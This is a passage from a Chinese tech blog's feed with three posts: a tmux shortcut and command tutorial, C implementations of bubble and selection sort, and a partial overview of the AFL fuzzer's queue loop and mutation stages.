    <content type="html"><![CDATA[<h3 id="0x00-Tmux简介"><a href="#0x00-Tmux简介" class="headerlink" title="0x00 Tmux简介"></a><font color="navy"><code>0x00 Tmux简介</code></font></h3><blockquote><p>tmux是一款优秀的终端复用软件，它比Screen更加强大，至于如何强大，网上有大量的文章讨论了这点，本文不再重复。tmux之所以受人们喜爱，主要得益于以下三处功能：</p><ul><li><code>丝滑分屏（split）</code>：虽然iTem2也提供了横向和竖向分屏功能，但这种分屏功能非常拙劣，完全等同于屏幕新开一个窗口，新开的pane不会自动进入到当前目录，也没有记住当前登录状态。这意味着如果我ssh进入到远程服务器时，iTem2新开的pane中，我依然要重新走一遍ssh登录的老路（omg）。tmux就不会这样，tmux窗口中，新开的pane，默认进入到之前的路径，如果是ssh连接，登录状态也依旧保持着，如此一来，我就可以随意的增删pane，这种灵活性，好处不言而喻。</li><li><code>保护现场（attach）</code>：即使命令行的工作只进行到一半，关闭终端后还可以重新进入到操作现场，继续工作。对于ssh远程连接而言，即使网络不稳定也没有关系，掉线后重新连接，可以直奔现场，之前运行中的任务，依旧在跑，就好像从来没有离开过一样；特别是在远程服务器上运行耗时的任务，tmux可以帮你一直保持住会话。如此一来，你就可以随时随地放心地进行移动办公，只要你附近的计算机装有tmux（没有你也可以花几分钟装一个），你就能继续刚才的工作。</li><li><code>会话共享（适用于结对编程或远程教学）</code>，将 tmux 会话的地址分享给他人，这样他们就可以通过 SSH 接入该会话。如果你要给同事演示远程服务器的操作，他不必直勾勾地盯着你的屏幕，借助tmux，他完全可以进入到你的会话，然后静静地看着他桌面上你风骚的键盘走位，只要他愿意，甚至还可以录个屏。</li></ul></blockquote><h3 id="0x01-Tmux快捷指令"><a href="#0x01-Tmux快捷指令" class="headerlink" title="0x01 Tmux快捷指令"></a><font color="navy"><code>0x01 Tmux快捷指令</code></font></h3><blockquote><p>关于快捷指令，首先要认识到的是：tmux的所有指令，都包含同一个前缀，默认为<code>Ctrl+b</code>，输入完前缀过后，控制台激活，命令按键才能生效。</p></blockquote><p><code>表一：系统指令</code></p><div class="table-container"><table><thead><tr><th style="text-align:center">前缀</th><th style="text-align:center">指令</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>?</code></td><td style="text-align:center">显示快捷键帮助文档</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>d</code></td><td style="text-align:center">断开当前会话</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>D</code></td><td style="text-align:center">选择要断开的会话</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>Ctrl+z</code></td><td style="text-align:center">挂起当前会话</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>r</code></td><td style="text-align:center">强制重载当前会话</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>s</code></td><td style="text-align:center">显示会话列表用于选择并切换</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>:</code></td><td style="text-align:center">进入命令行模式，此时可直接输入<code>ls</code>等命令</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>[</code></td><td style="text-align:center">进入复制模式，按<code>q</code>退出</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>]</code></td><td style="text-align:center">粘贴复制模式中复制的文本</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>~</code></td><td style="text-align:center">列出提示信息缓存</td></tr></tbody></table></div><p><code>表二：窗口（window）指令。</code></p><div class="table-container"><table><thead><tr><th style="text-align:center">前缀</th><th style="text-align:center">指令</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>c</code></td><td style="text-align:center">新建窗口</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>&amp;</code></td><td style="text-align:center">关闭当前窗口（关闭前需输入<code>y</code> or <code>n</code>确认）</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>0~9</code></td><td style="text-align:center">切换到指定窗口</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>p</code></td><td style="text-align:center">切换到上一窗口</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>n</code></td><td style="text-align:center">切换到下一窗口</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>w</code></td><td style="text-align:center">打开窗口列表，用于且切换窗口</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>,</code></td><td style="text-align:center">重命名当前窗口</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>.</code></td><td style="text-align:center">修改当前窗口编号（适用于窗口重新排序）</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>f</code></td><td style="text-align:center">快速定位到窗口（输入关键字匹配窗口名称）</td></tr></tbody></table></div><p><code>表三：面板（pane）指令</code></p><div class="table-container"><table><thead><tr><th style="text-align:center">前缀</th><th style="text-align:center">指令</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>&quot;</code></td><td style="text-align:center">当前面板上下一分为二，下侧新建面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>%</code></td><td style="text-align:center">当前面板左右一分为二，右侧新建面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>x</code></td><td style="text-align:center">关闭当前面板（关闭前需输入<code>y</code> or <code>n</code>确认）</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>z</code></td><td style="text-align:center">最大化当前面板，再重复一次按键后恢复正常（v1.8版本新增）</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>!</code></td><td style="text-align:center">将当前面板移动到新的窗口打开（原窗口中存在两个及以上面板有效）</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>;</code></td><td style="text-align:center">切换到最后一次使用的面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>q</code></td><td style="text-align:center">显示面板编号，在编号消失前输入对应的数字可切换到相应的面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>{</code></td><td style="text-align:center">向前置换当前面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>}</code></td><td style="text-align:center">向后置换当前面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>Ctrl+o</code></td><td style="text-align:center">顺时针旋转当前窗口中的所有面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>方向键</code></td><td style="text-align:center">移动光标切换面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>o</code></td><td style="text-align:center">选择下一面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>空格键</code></td><td style="text-align:center">在自带的面板布局中循环切换</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>Alt+方向键</code></td><td style="text-align:center">以5个单元格为单位调整当前面板边缘</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>Ctrl+方向键</code></td><td style="text-align:center">以1个单元格为单位调整当前面板边缘（Mac下被系统快捷键覆盖）</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>t</code></td><td style="text-align:center">显示时钟</td></tr></tbody></table></div><h3 id="0x02-会话管理"><a href="#0x02-会话管理" class="headerlink" title="0x02 会话管理"></a><font color="navy"><code>0x02 会话管理</code></font></h3><blockquote><p> 新建会话</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tmux new -s &lt;session-name&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>分离会话</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tmux detach</span></span><br></pre></td></tr></table></figure><blockquote><p>查看会话</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tmux ls</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> or</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux list-session</span></span><br></pre></td></tr></table></figure><blockquote><p>接入会话</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 使用会话编号</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux attach -t 0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用会话名称</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux attach -t &lt;session-name&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>杀死会话</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 使用会话编号</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux <span class="built_in">kill</span>-session -t 0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用会话名称</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux <span class="built_in">kill</span>-session -t &lt;session-name&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>切换会话</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 使用会话编号</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux switch -t 0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用会话名称</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux switch -t &lt;session-name&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>重命名会话</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tmux rename-session -t 0 &lt;new-name&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x03-窗口管理"><a href="#0x03-窗口管理" class="headerlink" title="0x03 窗口管理"></a><font color="navy"><code>0x03 窗口管理</code></font></h3><blockquote><p>划分窗口</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 划分上下两个窗格</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux split-window</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 划分左右两个窗格</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux split-window -h</span></span><br></pre></td></tr></table></figure><blockquote><p>移动光标</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 光标切换到上方窗格</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux select-pane -U</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 光标切换到下方窗格</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux select-pane -D</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 光标切换到左边窗格</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux select-pane -L</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 光标切换到右边窗格</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux select-pane -R</span></span><br></pre></td></tr></table></figure><blockquote><p>交换窗口位置</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 当前窗格上移</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux swap-pane -U</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 当前窗格下移</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux swap-pane -D</span></span><br></pre></td></tr></table></figure><blockquote><p>新建窗口</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tmux new-window</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 新建一个指定名称的窗口</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux new-window -n &lt;window-name&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>切换窗口</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 切换到指定编号的窗口</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux select-window -t &lt;window-number&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 切换到指定名称的窗口</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux select-window -t &lt;window-name&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>重命名窗口</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tmux rename-window &lt;new-name&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-Tmux简介&quot;&gt;&lt;a href=&quot;#0x00-Tmux简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 Tmux简介&quot;&gt;&lt;/a&gt;&lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00 Tmux简介&lt;/code&gt;&lt;/font&gt;&lt;/h
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>算法总结（C）</title>
    <link href="https://muzibing.github.io/2020/08/28/2020.08.28%EF%BC%88146%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/08/28/2020.08.28（146）/</id>
    <published>2020-08-27T16:00:00.000Z</published>
    <updated>2020-08-28T12:05:57.514Z</updated>
    
    <content type="html"><![CDATA[<h2 id="C-排序算法"><a href="#C-排序算法" class="headerlink" title="C 排序算法"></a><font color="orange"><code>C 排序算法</code></font></h2><hr><h3 id="0x00-冒泡排序"><a href="#0x00-冒泡排序" class="headerlink" title="0x00 冒泡排序"></a><font color="navy"><code>0x00 冒泡排序</code></font></h3><p><img src="/146-1.gif" alt></p><h4 id="1-算法思想"><a href="#1-算法思想" class="headerlink" title="1.算法思想"></a><code>1.算法思想</code></h4><p>冒泡排序的基本思想就是：</p><blockquote><p>从无序序列头部开始，进行两两比较，根据大小交换位置，直到最后将最大（小）的数据元素交换到了无序队列的队尾，从而成为有序序列的一部分；下一次继续这个过程，直到所有数据元素都排好序。</p><p>算法的核心在于每次通过两两比较交换位置，选出剩余无序序列里最大（小）的数据元素放到队尾。</p></blockquote><h4 id="2-图解算法"><a href="#2-图解算法" class="headerlink" title="2.图解算法"></a><code>2.图解算法</code></h4><p><img src="/images/146-2.png" alt></p><h4 id="3-算法实现"><a href="#3-算法实现" class="headerlink" title="3.算法实现"></a><code>3.算法实现</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bubble_sort</span><span class="params">(<span class="keyword">int</span> arr[], <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, temp;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++)</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len - <span class="number">1</span> - i; j++)</span><br><span class="line">            <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                temp = arr[j];</span><br><span class="line">                arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">                arr[j + <span class="number">1</span>] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[] = &#123; <span class="number">22</span>, <span class="number">34</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">82</span>, <span class="number">55</span>, <span class="number">89</span>, <span class="number">50</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">64</span>, <span class="number">35</span>, <span class="number">9</span>, <span class="number">70</span> &#125;;</span><br><span class="line">    <span class="keyword">int</span> len = (<span class="keyword">int</span>) <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(*arr);</span><br><span class="line">    bubble_sort(arr, len);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>, arr[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x01-选择排序"><a href="#0x01-选择排序" class="headerlink" title="0x01 选择排序"></a><font color="navy"><code>0x01 选择排序</code></font></h3><p><img src="/images/146-3.png" alt></p><h4 id="1-算法思想-1"><a href="#1-算法思想-1" class="headerlink" title="1.算法思想"></a><code>1.算法思想</code></h4><blockquote><p>它的工作原理如下。首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置，然后，再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。以此类推，直到所有元素均排序完毕。</p></blockquote><h4 id="2-图解算法-1"><a href="#2-图解算法-1" class="headerlink" title="2.图解算法"></a><code>2.图解算法</code></h4><p><img src="/images/146-4.jpg" alt></p><h4 id="3-算法实现-1"><a href="#3-算法实现-1" class="headerlink" title="3.算法实现"></a><code>3.算法实现</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> *a,<span class="keyword">int</span> *b)</span> <span class="comment">//交換兩個變數</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">selection_sort</span><span class="params">(<span class="keyword">int</span> arr[], <span class="keyword">int</span> len)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span> ; i &lt; len - <span class="number">1</span> ; i++) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> min = i;</span><br><span class="line">        <span class="keyword">for</span> (j = i + <span class="number">1</span>; j &lt; len; j++)     <span class="comment">//走訪未排序的元素</span></span><br><span class="line">            <span class="keyword">if</span> (arr[j] &lt; arr[min])    <span class="comment">//找到目前最小值</span></span><br><span class="line">                min = j;    <span class="comment">//紀錄最小值</span></span><br><span class="line">        swap(&amp;arr[min], &amp;arr[i]);    <span class="comment">//做交換</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x02-插入排序"><a href="#0x02-插入排序" class="headerlink" title="0x02 插入排序"></a><font color="navy"><code>0x02 插入排序</code></font></h3><p><img src="/images/146-5.gif" alt></p><h4 id="1"><a href="#1" class="headerlink" title="1."></a><code>1.</code></h4><p>``</p><p>``</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;C-排序算法&quot;&gt;&lt;a href=&quot;#C-排序算法&quot; class=&quot;headerlink&quot; title=&quot;C 排序算法&quot;&gt;&lt;/a&gt;&lt;font color=&quot;orange&quot;&gt;&lt;code&gt;C 排序算法&lt;/code&gt;&lt;/font&gt;&lt;/h2&gt;&lt;hr&gt;

&lt;h3 id=&quot;0x
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>AFL详细总结（持续更新）</title>
    <link href="https://muzibing.github.io/2020/08/25/2020.08.24%EF%BC%88145%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/08/25/2020.08.24（145）/</id>
    <published>2020-08-24T16:00:00.000Z</published>
    <updated>2020-09-02T03:03:00.644Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00-afl的流程font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-afl的流程font"></a> <font color="navy"><code>0x00 AFL的流程</code></font></h3><p><img src="/images/145-1.jpg" alt></p><h4 id="font-color-blue1afl整体框架font"><a class="markdownIt-Anchor" href="#font-color-blue1afl整体框架font"></a> <font color="blue"><code>1.AFL整体框架</code></font></h4><blockquote><ol><li><p>main函数先进行初始化和选项处理；</p></li><li><p>执行input文件夹下的预先准备的所有testcase（perform_dry_run），生成初始化的queue和bitmap；</p></li><li><p>通过cull_queue对queue进行精选，减小input的量；</p></li><li><p>然后进行while(1)循环不断进行fuzz。</p></li></ol><p>每次在fuzz一个queue后，就会进入while(1),并重新调用cull_queue()对队列进行精选，而在while(1)具体实现以下过程：</p><ol><li><p>cull_queue()根据top_rated设置queue中的favored标志，对queue进行精选，选出favored</p></li><li><p>判断queue_cur是否为NULL，如果是，则表示已经完成对队列的遍历，queue_cycle++,初始化相关参数，重新开始遍历队列；</p></li><li><p>fuzz queue_cur对应的input文件；</p></li><li><p>判断是否结束，并更新queue_cur和current_entry；</p></li></ol><p>当队列中的所有文件都经过变异测试了，则完成一次”cycle done”;<br>整个队列又会从第一个文件开始，再次继续进行变异，不过与第一次变异不同的是，因为没有随机性，这一次变异就不需要再进行deterministic fuzzing了。而至于什么是deterministic fuzzing，我们在下面的fuzz策略中会作介绍；</p></blockquote><h4 id="font-colorblue2afl的fuzz策略font"><a class="markdownIt-Anchor" href="#font-colorblue2afl的fuzz策略font"></a> <font color="blue"><code>2.AFL的fuzz策略</code></font></h4><blockquote><p>总的来讲，AFL维护了一个队列(queue)，每次从这个队列中取出一个文件，对其进行大量变异，并检查运行后是否会引起目标崩溃、发现新路径等结果。变异的主要类型如下：</p><ol><li><p>bitflip，按位翻转，1变为0，0变为1</p></li><li><p>arithmetic，整数加/减算术运算</p></li><li><p>interest，把一些特殊内容替换到原文件中</p></li><li><p>dictionary，把自动生成或用户提供的token替换/插入到原文件中</p></li><li><p>havoc，中文意思是“大破坏”，此阶段会对原文件进行大量变异</p></li><li><p>splice，中文意思是“绞接”，此阶段会将两个文件拼接起来得到一个新的文件</p></li></ol><p>其中，前四项bitflip, arithmetic, interest, dictionary由于其变异方式没有随机性，所以也称为deterministic fuzzing；而havoc和splice则存在随机性，是所有状况的fuzzer（是否dumb mode、主从fuzzer）都会执行的变异。</p><p><code>bitflip变异</code>：拿到一个原始文件，首先的变异类型就是bitflip，而且还会根据翻转量/步长进行多种不同的翻转，按照顺序依次为：</p><ul><li>bitflip 1/1，每次翻转1个bit，按照每1个bit的步长从头开始</li><li>bitflip 2/1，每次翻转相邻的2个bit，按照每1个bit的步长从头开始</li><li>bitflip 4/1，每次翻转相邻的4个bit，按照每1个bit的步长从头开始</li><li>bitflip 8/8，每次翻转相邻的8个bit，按照每8个bit的步长从头开始，即依次对每个byte做翻转</li></ul><p><code>effector map的生成</code>：</p><p>完成bitflip 8/8的同时，还生成了effector map，该作用是对byte进行标记，在对每个byte进行翻转变异时，其新的执行路径与原来的路径不一致时，就对该byte标记为1，表示即为有效的，否则标记为0；这样做的优点是如果一个byte完全翻转，都无法带来执行路径的变化，那么这个byte很有可能是属于”data”，而非”metadata”（例如size, flag等），对整个fuzzing的意义不大。所以，在随后的一些变异中，会参考effector map，跳过那些“无效”的byte，从而节省了执行资源。</p><ul><li>bitflip 16/8，每次翻转相邻的16个bit，按照每8个bit的步长从头开始，即依次对每个word做翻转</li><li>bitflip 32/8，每次翻转相邻的32个bit，按照每8个bit的步长从头开始，即依次对每个dword做翻转</li></ul><p><code>arithmetic变异</code>：</p><ul><li>arith 8/8，每次对8个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个byte进行整数加减变异</li><li>arith 16/8，每次对16个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个word进行整数加减变异</li><li>arith 32/8，每次对32个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个dword进行整数加减变异</li></ul><p>加减运算的相关设置在config.h定义，由于整数存在大端序和小端序两种表示方式，AFL会贴心地对这两种整数表示方式都进行变异。此外，AFL会智能的跳过某些arithmetic,第一种情况就是前面提到的effector map：如果一个整数的所有bytes都被判断为“无效”，那么就跳过对整数的变异。第二种情况是之前bitflip已经生成过的变异：如果加/减某个数后，其效果与之前的某种bitflip相同，那么这次变异肯定在上一个阶段已经执行过了，此次便不会再执行。</p><p><code>interest变异</code>：</p><ul><li>interest 8/8，每次对8个bit进替换，按照每8个bit的步长从头开始，即对文件的每个byte进行替换</li><li>interest 16/8，每次对16个bit进替换，按照每8个bit的步长从头开始，即对文件的每个word进行替换</li><li>interest 32/8，每次对32个bit进替换，按照每8个bit的步长从头开始，即对文件的每个dword进行替换</li></ul><p>其中interest value的值在config.h已经设定好</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;   <span class="meta">#<span class="meta-keyword">define</span> INTERESTING_8 \</span></span><br><span class="line">&gt;   <span class="number">-128</span>,         <span class="comment">/* Overflow signed 8-bit when decremented  */</span> \</span><br><span class="line">&gt;   <span class="number">-1</span>,           <span class="comment">/*                                         */</span> \</span><br><span class="line">&gt;   <span class="number">0</span>,            <span class="comment">/*                                         */</span> \</span><br><span class="line">&gt;   <span class="number">1</span>,            <span class="comment">/*                                         */</span> \</span><br><span class="line">&gt;   <span class="number">16</span>,           <span class="comment">/* One-off with common buffer size         */</span> \</span><br><span class="line">&gt;   <span class="number">32</span>,           <span class="comment">/* One-off with common buffer size         */</span> \</span><br><span class="line">&gt;   <span class="number">64</span>,           <span class="comment">/* One-off with common buffer size         */</span> \</span><br><span class="line">&gt;   <span class="number">100</span>,          <span class="comment">/* One-off with common buffer size         */</span> \</span><br><span class="line">&gt;   <span class="number">127</span>           <span class="comment">/* Overflow signed 8-bit when incremented  */</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>可以看到，用于替换的基本都是可能会造成溢出的数;与之前相同，effector map仍然会用于判断是否需要变异；</p><p><code>dictionary变异</code>：</p><ul><li>user extras (over)，从头开始，将用户提供的tokens依次替换到原文件中</li><li>user extras 